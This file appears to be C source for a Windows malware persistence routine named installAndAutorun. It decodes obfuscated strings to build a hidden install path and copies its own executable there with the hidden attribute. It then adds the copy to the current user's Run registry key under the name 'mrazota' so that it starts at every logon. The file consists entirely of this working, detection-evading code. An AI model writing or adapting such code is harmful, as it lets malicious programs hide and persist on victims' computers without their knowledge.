#include <Windows.h>
#include <malloc.h>
#include "getModulePath.h"

#include "installAndAutorun.h"
BOOL installAndAutorun() {
	DWORD install_len;
	static const wchar_t unexp_a[] = { 0xe335, 0xe4a9, 0xa76f, 0x1fdb, 0xe3f1, 0xad5, 0x9fb, 0xe742, 0x1b4f, 0xa328, 0x648d, 0x5cac, 0x9bb7, 0xa8eb, 0x2a8d, 0x379, 0xaf5d, 0x2c0e, 0x417e, 0xc54f, 0x552f };
	static const wchar_t unexp_b[] = { 0x1cef, 0x1b17, 0x58c0, 0xe074, 0x1c4a, 0xf56b, 0xf650, 0x18fc, 0xe495, 0x5c8b, 0x9b1f, 0xa321, 0x6429, 0x576e, 0xd51d, 0xfcf2, 0x50c3, 0xd3df, 0xbee4, 0x3ac8, 0xaab5 };
	wchar_t unexp[22];
	unexp[21] = 0;
	for (unsigned int i = 0; i < 21; i++) unexp[i] = ~(unexp_a[i] ^ unexp_b[i]);
	install_len = ExpandEnvironmentStringsW(unexp, NULL, 0);
	if (install_len) {
		LPWSTR install_path;
		install_path = _malloca(install_len * sizeof(WCHAR));
		if (install_path && ExpandEnvironmentStringsW(unexp, install_path, install_len)) {
			DWORD modpath_len;
			LPWSTR modpath;
			modpath = getModulePath(&modpath_len);
			if (modpath) {
				if (wcscmp(install_path, modpath)) {
					HANDLE read_handle;
					read_handle = CreateFileW(modpath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
					if (read_handle) {
						LARGE_INTEGER file_size;
						if (GetFileSizeEx(read_handle, &file_size) && (file_size.HighPart == 0)) {
							LPVOID contents;
							contents = malloc(file_size.LowPart);
							if (contents) {
								if (ReadFile(read_handle, contents, file_size.LowPart, NULL, NULL)) {
									HANDLE write_handle;
									write_handle = CreateFileW(install_path, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
									if (write_handle) {
										if (WriteFile(write_handle, contents, file_size.LowPart, NULL, NULL)) {
											HKEY run_key;
											static const wchar_t run_a[] = { 0x4d41, 0xfbd9, 0x5377, 0x7663, 0xabf, 0x2847, 0x2e8a, 0x9b84, 0x2417, 0xaba5, 0xe178, 0xbe37, 0x7a4d, 0x43c, 0x337, 0x33c, 0x8735, 0x899a, 0x9340, 0x1f00, 0x56c9, 0x856c, 0xf536, 0xac68, 0xb9d5, 0x857a, 0x8c93, 0x38a8, 0xadbd, 0xc3b3, 0xfa5e, 0xafba, 0x27ce, 0xfa20, 0xe925, 0x9ba6, 0xbafe, 0x7a72, 0x6f3b, 0x2e83, 0xf97f, 0x1324, 0xfc5f, 0xa9fa, 0x9f91 };
											static const wchar_t run_b[] = { 0xb2ed, 0x449, 0xacee, 0x89e8, 0xf537, 0xd7d9, 0xd107, 0x641e, 0xdbb4, 0x5417, 0x1eee, 0x41ab, 0x85c0, 0xfbac, 0xfcbb, 0xfcac, 0x78ac, 0x7611, 0x6ce3, 0xe0a8, 0xa95f, 0x7afd, 0xaad, 0x53f8, 0x465d, 0x7af6, 0x7330, 0xc714, 0x5237, 0x3c3e, 0x5d3, 0x5020, 0xd85f, 0x5ab, 0x168c, 0x643c, 0x4573, 0x85fe, 0x90ad, 0xd113, 0x6ee, 0xec87, 0x3f2, 0x5670, 0x6000 };
											wchar_t run[46];
											run[45] = 0;
											for (unsigned int i = 0; i < 45; i++) run[i] = ~(run_a[i] ^ run_b[i]);
											if (ERROR_SUCCESS == RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ | KEY_WRITE, &run_key)) {
												if (ERROR_SUCCESS != RegSetValueExW(run_key, L"mrazota", 0, REG_SZ, (BYTE*)install_path, install_len * sizeof(DWORD))) DeleteFileW(install_path);
												RegCloseKey(run_key);
											}
											else DeleteFileW(install_path);
										};
										CloseHandle(write_handle);
									};
								};
								free(contents);
							};
						};
						CloseHandle(read_handle);
					};
				}
				else {
					free(modpath);
					_freea(install_path);
					return TRUE;
				};
			};
			free(modpath);
		};
		_freea(install_path);
	};
	return FALSE;
};